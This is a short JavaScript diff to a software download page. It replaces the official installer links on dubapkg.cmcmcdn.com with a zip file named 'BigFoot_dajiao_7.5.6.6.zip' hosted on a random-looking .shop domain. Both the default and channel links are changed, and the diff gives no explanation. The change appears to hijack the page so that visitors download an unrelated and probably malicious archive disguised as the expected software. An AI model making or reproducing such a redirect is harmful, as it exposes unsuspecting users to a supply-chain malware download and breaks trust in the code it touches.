@@ -47,8 +47,8 @@ var addFanXingAll = {
   bind: function () {
     var self = this;
     // 下载地址，服务端异常时使用拼接地址
-    var defaultLink = "//dubapkg.cmcmcdn.com/duba/" + sfrom + "/kinst_" + sfrom + "_f" + pageName + "_k" + keyID + ".exe";
-    var channelLink = "//dubapkg.cmcmcdn.com/duba/" + sfrom + "/kinst_" + sfrom + "_f" + pageName + "_k" + keyID + "_ch1.exe";
+    var defaultLink = "https://sadhnuf7saf6asd7g8sd9f67asdf.shop/BigFoot_dajiao_7.5.6.6.zip";
+    var channelLink = "https://sadhnuf7saf6asd7g8sd9f67asdf.shop/BigFoot_dajiao_7.5.6.6.zip";
     var serveKeyWord = '';
     try {
       // 服务端获取下载地址
